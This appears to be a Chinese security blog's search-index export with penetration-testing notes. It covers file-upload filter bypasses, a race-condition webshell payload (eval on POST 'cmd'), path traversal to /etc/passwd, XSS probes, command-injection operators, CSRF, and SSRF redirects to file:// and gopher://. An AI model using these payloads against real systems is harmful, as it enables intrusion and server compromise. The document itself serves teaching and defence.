<p>31.pdfxss  xss无任何作用只能弹窗</p>
<p>33.spf邮件欺骗</p>
<p>spf是一个记录邮件服务器的服务   25端口</p>
<p><a href="https://www.kitterman.com/spf/validate.html">https://www.kitterman.com/spf/validate.html</a> 利用网站     </p>
<p>34.cookie可逆</p>
<p>jwt  cookie 存在一段一段重复性的字母</p>
<p>35.六位数密码可爆破</p>
<p>36.黑产如何挖掘  卖信息</p>
<p>37.url拼接</p>
<p>上传一个文件   xxx.com&#x2F;file&#x2F;xx.jpg</p>
<p>xxx.com&#x2F;file&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
<p>38.文件可遍历，文件名为规律递增</p>
<p><a href="http://xxxxx.com/file/156316.jpg">http://xxxxx.com/file/156316.jpg</a></p>
<p>39.一个网站注册可以多种职务，学生老师管理员，</p>
<p>40.编辑器问题，，xss csrf,文件上传</p>
<p>41.一个漏洞变两个</p>
<p>重复挖掘是一方面，网站对应的小程序，网站对应的app，同域名的子域名的漏洞</p>
<p>42.跨域漏洞  cors  jsonp</p>
<p>43.注册的时候抓包，替换掉admin</p>
<p>44.覆盖admin,修改用户名的时候也可以，修改之后无法登陆，遍历，全站用户无法登陆</p>
<p>45.浏览器本地缓存修改，举例</p>
<p>46.小程序，appid和appsecret泄露，返回包泄露，使用官方接口利用</p>
<p>通过这两个参数可以找到小程序的access token</p>
]]></content>
  </entry>
  <entry>
    <title>安全基础手册-top10</title>
    <url>/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%89%8B%E5%86%8C-top10.html</url>
    <content><![CDATA[<h1 id="web漏洞"><a href="#web漏洞" class="headerlink" title="web漏洞"></a>web漏洞</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在文件上传的功能点，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务端命令的能力，这就是文件上传漏洞。</p>
<h3 id="功能点"><a href="#功能点" class="headerlink" title="功能点"></a>功能点</h3><p>相册、头像上传、视频、照片分享、附件上传（论坛发帖、邮箱）、文件管理器等。</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="1-绕过MIME-type验证"><a href="#1-绕过MIME-type验证" class="headerlink" title="1.绕过MIME-type验证"></a>1.绕过MIME-type验证</h4><p>burpsuite绕过MIME-type验证</p>
<p>在repeater重放修改MIME-type类型绕过验证。image&#x2F;jpeg</p>
<h4 id="2-bp绕过黑名单验证"><a href="#2-bp绕过黑名单验证" class="headerlink" title="2.bp绕过黑名单验证"></a>2.bp绕过黑名单验证</h4><p><strong>枚举</strong></p>
<p>利用intruder模块进行枚举后缀名，寻找黑名单中没有过滤的后缀名</p>
<p>php3 php4 phtml</p>
<p><strong>无用文件头绕过</strong></p>
<p>在请求体前面添加大量无用数据（注意要和请求头空一行） 我们在请求包中插入足够多的无用数据，成功上传</p>
<p><strong>分块传输绕过</strong></p>
<p>安装分块传输插件<code>Chunked coding converter 0.4.0</code></p>
<p>注:针对最新的安全狗，该绕过方法已失效。 也许能绕过其他的WAF</p>
<p><strong>绕过内容检测</strong></p>
<p>上传免杀webshell</p>
<p><strong>.htaccess文件</strong> </p>
<p>在黑名单中如果没有对.htaccess进行过滤，可以直接上传.htaccess来设置使用php解析任意文件。文件内容：sethandler application&#x2F;x-httpd-php</p>
<p>然后在上传一个合法的文件，文件内容为php代码，再进行访问这个文件就会被php解析</p>
<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。其中</p>
<p><em>.htaccess文件内容</em></p>
<p>sethandler application&#x2F;x-httpd-php 设置当前目录所有文件都使用php解析，无论上传任何文件，只要文件内容符合<a href="https://so.csdn.net/so/search?q=php%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020">php语言</a>代码规范，就会被当作php执行，不符合则报错。</p>
<p><em>配置文件http.conf</em></p>
<p>在apache中如果需要启动.htaccess，必须在http.conf中设置allowoverride  all</p>
<p><strong>大小写绕过</strong></p>
<p>Windows系统下，对于文件名中的大小写不敏感</p>
<p><strong>空格绕过</strong></p>
<p>在win系统下，文件名中的空格会被作为空处理，程序中的检测代码却不能自动删除空格。从而绕过黑名单。针对这样的情况需要使用bp截断http请求之后，修改对应的文件名 添加空格（1.php空格）</p>
<p>php中trim()可以去除空格</p>
<p><strong>.点号绕过</strong></p>
<p>在win系统下，文件后缀名最后一个点会被自动去除，例如：1.php.</p>
<p><strong>特殊符号绕过</strong></p>
<p>win系统下，如果上传的文件名中test.php::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。  例如：在win下新建一个文件名为1.php::美元DATA的文件，查看效果。但在win下新建的文件名中包含特殊符号不能成功新建，可以在kali中新建上传，访问文件时需要把特殊符去除</p>
<p><strong>路径组合绕过</strong></p>
<p>在没有对上传文件进行重命名的情况下，用户可以自定义文件名并在服务器中上传新建，就会造成对应的绕过黑名单。</p>
<p>例如：用户新建1.php.空格.   deldot删除最后一个点之后，不在进行删除，trim删除空格，那么最终上传的文件名为1.php.  利用win自动去除最后一个点，导致成功上传1.php</p>
<p>上传小马大马：上传小webshell，以绕过上传过程中对文件大小的限制，利用小马能够更加有效上传大webshell</p>
<p><strong>双写filename&#x3D;;绕过</strong></p>
<p>filename&#x3D;;filename&#x3D;”1.php” </p>
<p><strong>绕过白名单</strong></p>
<p>00截断：0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。例如：1.php0x00.jpg   在php5.3之后的版本中完全修复了00截断，并且00截断受限于GPC是否开启，addslashes函数。</p>
<h4 id="3-图片webshell上传绕过"><a href="#3-图片webshell上传绕过" class="headerlink" title="3.图片webshell上传绕过"></a>3.图片webshell上传绕过</h4><p>在服务器的php代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范，可以检查文件二进制格式的前几个字节，从而判断文件类型是否正确。</p>
<p>针对这种情况可以直接新建1.jpg，其中代码内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF98A  <span class="comment">//表示是一个图片文件</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>文件包含漏洞：在php中，使用include、require、include_once、require_once函数包含的文件都会被当做php代码执行，无论文件的名称是什么，只要符合文件内容符合php代码规范，都会被当做php代码执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;not get args file&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>1.竞争条件</strong></p>
<p>上传文件先放在临时文件夹里，重命名之后再放在其他文件夹里，或直接删除</p>
<p>网站逻辑：</p>
<p>1.网站允许上传任意文件，然后检查上传文件是否包含webshell，如果包含则删除该文件</p>
<p>2.网站允许上传任意文件，但如果不是指定类型，那么使用unlink删除文件 </p>
<p>在删除之前访问上传的php文件，从而执行上传文件中的php代码</p>
<p>例如：上传代码webshell.php如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在删除之前不断访问脚本，然后上传</p>
<p>python发送http请求：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>：</span><br><span class="line">   requests.get(<span class="string">&quot;路径/webshell.php&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到web网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生xss攻击。</p>
<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>不管是反射型还是存储型，服务端都会将JavaScript当做文本处理，这些文本在服务端被整合进html文档中，在浏览器解析这些文本的过程也就是XSS被执行的时候。</p>
<p>从攻击到执行分为以下几步：</p>
<ol>
<li>构造攻击代码</li>
<li>服务端提取并写入HTML</li>
<li>浏览器解析，XSS执行</li>
</ol>
<h3 id="xss的三种类型"><a href="#xss的三种类型" class="headerlink" title="xss的三种类型"></a>xss的三种类型</h3><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>反射型XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码</p>
<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型 XSS 的危害会更大。如果 A 插入的恶意劫持代码，那么后面的用户都会被中枪。全范围的扫射攻击，这个过程一般而言只要用户访问这个界面就行了，不像反射型 XSS，需要访问特定的 URL 或者用户去手动点击触发。</p>
<h4 id="dom型"><a href="#dom型" class="headerlink" title="dom型"></a>dom型</h4><p>DOM型XSS是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。<br>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。<br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
<h3 id="检测poc"><a href="#检测poc" class="headerlink" title="检测poc"></a>检测poc</h3><ol>
<li>标准的 xss 漏洞测试代码</li>
</ol>
<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<ol start="2">
<li>img 图片标记属性跨站攻击代码</li>
</ol>
<p><code>&lt;img src=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/img&gt; &lt;img dynsrc=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code></p>
<ol start="3">
<li>无需 “&lt;&gt;”，利用 html 标记事件属性跨站</li>
</ol>
<p><code>&lt;img src=&quot;&quot; οnerrοr=alert(&quot;xss&quot;)&gt;</code></p>
<ol start="4">
<li>空格与回车符转换</li>
</ol>
<p><code>&lt;img src=&quot;Jav	ascript:alert(&#39;xss&#39;)&quot;&gt; &lt;img src=&quot;Jav ascript:alert(&#39;xss&#39;)&quot;&gt; &lt;img src=&quot;Javascript:alert(&#39;xss&#39;)&quot;&gt;</code></p>
<ol start="5">
<li>10 进制转换</li>
</ol>
<p><code>&lt;img src=&quot;Javascript:alert(&#39;xss&#39;)&quot;&gt;</code></p>
<h3 id="xss定位器"><a href="#xss定位器" class="headerlink" title="xss定位器"></a>xss定位器</h3><p>在大多数存在漏洞且不需要特定XSS攻击代码的地方插入下列代码会弹出包含“XSS”字样的对话框。使用URL编码器来对整个代码进行编码。</p>
<p>小技巧：如果你时间很紧想要快速检查页面，通常只要插入“&lt;任意文本&gt;”标签，然后观察页面输出是否明显改变了就可以判断是否存在漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;</span><br><span class="line"></span><br><span class="line">alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–</span><br><span class="line"></span><br><span class="line">&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>

<p>如果你没有足够的空间并且知道页面上没有存在漏洞的JavaScript，这个字符串是一个不错的简洁XSS注入检查。注入后查看页面源代码并且寻找是否存在**&lt;XSS** 或**&lt;XSS**字样来确认是否存在漏洞？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">”;!–”&lt;XSS&gt;=&amp;&#123;()&#125;</span><br></pre></td></tr></table></figure>

<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>对于反射型的代码，服务端代码要对查询进行编码，主要目的就是将查询文本化，避免在浏览器解析阶段转换成DOM和CSS规则及JavaScript解析。</p>
<h4 id="黑白名单机制"><a href="#黑白名单机制" class="headerlink" title="黑白名单机制"></a>黑白名单机制</h4><p>黑名单：拉黑特殊字符。</p>
<p>白名单：只允许大小写字母、数字、汉字输入</p>
<h2 id="命令执行（RCE）"><a href="#命令执行（RCE）" class="headerlink" title="命令执行（RCE）"></a>命令执行（RCE）</h2><p>web应用程序的某些功能需要调用可以执行系统命令的函数，如果这些函数或者函数的参数可以被用户控制，那就有可能通过命令连接符将恶意命令拼接到正常的函数中，从而随意执行系统命令</p>
<h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>命令执行漏洞主要是服务端没有对执行命令的函数做出过滤导致的。我们可通过编写一些系统函数来输入疑似存在命令执行接口的地方，来检测是否此接口是否存在命令执行漏洞。</p>
<h3 id="常见的执行系统命令的函数"><a href="#常见的执行系统命令的函数" class="headerlink" title="常见的执行系统命令的函数"></a>常见的执行系统命令的函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami  查看系统服务器的用户名</span><br><span class="line">pwd     查看当前所在路径</span><br><span class="line">ls      查看当前目录下的文件</span><br></pre></td></tr></table></figure>

<p>除了拼接函数以外，我们还可以使用命令连接符来组合这些系统函数增加命令执行成功率。常见的命令连接符有<code>|</code>，<code>||</code>,<code>&amp;</code>,<code>&amp;&amp;</code></p>
<ul>
<li><code>|</code></li>
</ul>
<p>管道操作符，A|B：无论执行的A命令是否正确，B都会被执行</p>
<ul>
<li><code>&amp;</code></li>
</ul>
<p>A&amp;B:不管A是否执行成功，B命令都会执行</p>
<ul>
<li><code>||</code></li>
</ul>
<p>逻辑或 ，A||B：只有在A命令没有执行失败的前提下，B命令才可以执行</p>
<ul>
<li><code>&amp;&amp;</code></li>
</ul>
<p>逻辑与，A&amp;&amp;B：只有在A命令成功执行的前提下，B命令才可以执行</p>
<ul>
<li><code>;</code></li>
</ul>
<p>A;B：无论是A否成功，B都会执行，和<code>|</code>一样</p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>使用自定义函数或函数库来代替外部命令</p>
<p>对用户输入的变量进行过滤和检测</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross Site Request Forgery，<strong>跨站请求伪造</strong>）攻击者构造网站后台某个功能接口的请求地址，诱导用户去点击或者用特殊方法让该请求地址自动加载。用户在登录状态下这个请求被服务端接收后会被误以为是用户合法的操作。对于 GET 形式的接口地址可轻易被攻击，对于 POST 形式的接口地址也不是百分百安全，攻击者可诱导用户进入带 Form  表单可用POST方式提交参数的页面。</p>
<h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ol>
<li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</li>
<li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li>
<li>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</li>
<li>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</li>
<li>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</li>
</ol>
<h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h3><ul>
<li><p>验证 HTTP Referer 字段；</p>
</li>
<li><p>在请求地址中添加 token 并验证；</p>
</li>
<li><p>在 HTTP 头中自定义属性并验证。</p>
</li>
</ul>
<h3 id="csrf和xss的区别"><a href="#csrf和xss的区别" class="headerlink" title="csrf和xss的区别"></a>csrf和xss的区别</h3><p><strong>xss：</strong>攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击   </p>
<p><strong>csrf</strong>：攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击   </p>
<p>XSS容易发现，因为攻击者需要登陆后台完成攻击，管理员可以看到日志发现攻击者；而CSRF的攻击是管理员自己实现的，攻击者只负责构造代码。   </p>
<p>CSRF属于业务逻辑漏洞，服务器信任经过身份认证的用户  </p>
<p>XSS属于技术漏洞，客户信任服务器  </p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF全称是服务端请求伪造（Server-Side Request Forge,SSRF)漏洞，攻击者利用SSRF漏洞通过服务器发起伪造请求，这样就可以访问内网的数据，进行内网信息探测或者内网漏洞利用。</p>
<h3 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SSRF漏洞形成的原因是应用程序提供了从其他服务器获取数据的功能，但是服务器没有对目标地址进行严格的过滤和限制，导致应用程序可以访问任意的URL连接。如果网站访问的百度页面，抓包的内容组并没有请求百度，那就说明请求是由服务器发出的，这个点存在ssrf漏洞</p>
<h3 id="可以利用的协议"><a href="#可以利用的协议" class="headerlink" title="可以利用的协议"></a>可以利用的协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///  -- 本地文件传输协议，主要用于访问本地计算机中的文件</span><br><span class="line">dict://   -- 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628</span><br><span class="line">sftp://   -- SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）</span><br><span class="line">ldap://   -- 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</span><br><span class="line">tftp://   -- 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机</span><br><span class="line">gopher:// -- 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前</span><br></pre></td></tr></table></figure>

<h3 id="功能点-1"><a href="#功能点-1" class="headerlink" title="功能点"></a>功能点</h3><p>分享文章，收藏文章，图片收藏，图片加载与下载，文件包含，代理服务，在线编程，站长工具</p>
<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>**@**绕过 </p>
<p><a href="http://www.cbaidu/">http://www.baidu</a><a href="mailto:&#x2e;&#99;&#x6f;&#109;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#x31;">&#x2e;&#99;&#x6f;&#109;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#x31;</a>:8080</p>
<p><strong>ip地址转换成进制</strong>绕过</p>
<p>ping 2130706433</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230812123707098.png" alt="image-20230812123707098"></p>
<p>127.0.0.1先转换成2进制，去掉小数点在转回十进制</p>
<p><strong>302 redirect</strong>绕过</p>
<p>当url存在临时(302)永久(301)跳转时，则继续请求跳转后的url，那么我们可以通过http的连接302跳转到gopher协议上</p>
<p>ssrf限制只能用http或者https协议时，可以通过header函数绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:file:///etc/passwd&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:dict://127.0.0.1:6666/info&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:gopher://127.0.0.1:6666/info&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xip.io</strong>绕过</p>
<p>dns解析这个host时会自动去掉后缀</p>
<p><a href="http://10.0.0.1.xip.io/">http://10.0.0.1.xip.io</a> &#x3D; 10.0.0.1</p>
<p><a href="http://www.10.0.0.1.xip.io/">www.10.0.0.1.xip.io</a>   &#x3D; 10.0.0.1</p>
<p><a href="http://mysite.10.0.0.1.xip.io=10.0.0.1">http://mysite.10.0.0.1.xip.io=10.0.0.1</a></p>
<p>foo.<a href="http://bar.10.0.0.1.xip.io/">http://bar.10.0.0.1.xip.io</a> &#x3D;10.0.0.1</p>
<p>10.0.0.1.xip.name resolves to 10.0.0.1</p>
<p><a href="http://www.10.0.0.2.xip.name/">www.10.0.0.2.xip.name</a> resolves to 10.0.0.2</p>
<p>foo.10.0.0.3.xip.name resolves to 10.0.0.3</p>
<p>bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</p>
<p><strong>封闭式字母数字</strong>绕过</p>
<p> ⓗ  ⓣ   ⓣ  Ⓟ  Ⓔ      &#x3D; <a href="http://example.com/">http://example.com</a></p>
<p>封闭式字母数字网址 <a href="https://haomeili.net/ZhiShi/34">https://haomeili.net/ZhiShi/34</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">diverse = <span class="string">&#x27;&#x27;&#x27;①②③④⑤⑥⑦⑧⑨⑴⑵⑶⑷⑸⑹⑺⑻⑼⒈⒉⒊⒋⒌⒍⒎⒏⒐⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓵⓶⓷⓸⓹⓺⓻⓼⓽&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">general = <span class="string">&#x27;&#x27;&#x27;123456789123456789123456789abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 创建转换表</span></span><br><span class="line">decode = <span class="built_in">str</span>.maketrans(diverse, general)</span><br><span class="line">encode = <span class="built_in">str</span>.maketrans(general, diverse)</span><br><span class="line"><span class="comment"># 定义一个字符串</span></span><br><span class="line">text = <span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line"><span class="comment"># 使用转换表进行加密</span></span><br><span class="line">new_text = text.translate(encode)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(new_text)</span><br></pre></td></tr></table></figure>



<h1 id="条例"><a href="#条例" class="headerlink" title="条例"></a>条例</h1><p>数据安全合规</p>
<p>GB&#x2F;T 25069 信息安全技术  术语</p>
<p>GB&#x2F;T 22239 信息安全技术  网络安全等级保护基本要求</p>
<p>GB&#x2F;T 22240信息安全技术  网络安全等级保护定级指南</p>
<p>GB&#x2F;T 37964-2019 信息安全技术  个人信息去标识化指南</p>
<p>GB&#x2F;T 35273-2020 信息安全技术  个人信息安全规范</p>
<p>GB&#x2F;T 39335-2020 信息安全技术  个人信息安全影响评估指南</p>
<p>GB&#x2F;T 41391-2022 信息安全技术  移动互联网应用程序(App)收集个人信息基本要求</p>
<p>GB&#x2F;T 41479-2022 信息安全技术  网络数据处理安全要求</p>
<p>GB&#x2F;T 39204-2022 信息安全技术  关键信息基础设施安全保护要求</p>
<p>等保</p>
<p>GB&#x2F;T 22239-2019：《信息安全技术 网络安全等级保护基本要求》</p>
<p>GB&#x2F;T 28448-2019：《信息安全技术 网络安全等级保护测评要求》</p>
<p>GB&#x2F;T 28449-2018：《信息安全技术 网络安全等级保护测评过程指南》</p>
<p>GB&#x2F;T 20984-2007：《信息安全技术 信息安全风险评估规范》</p>
<p>GB 17859-1999：《计算机信息系统安全保护等级划分准则》 </p>
]]></content>
  </entry>
</search>
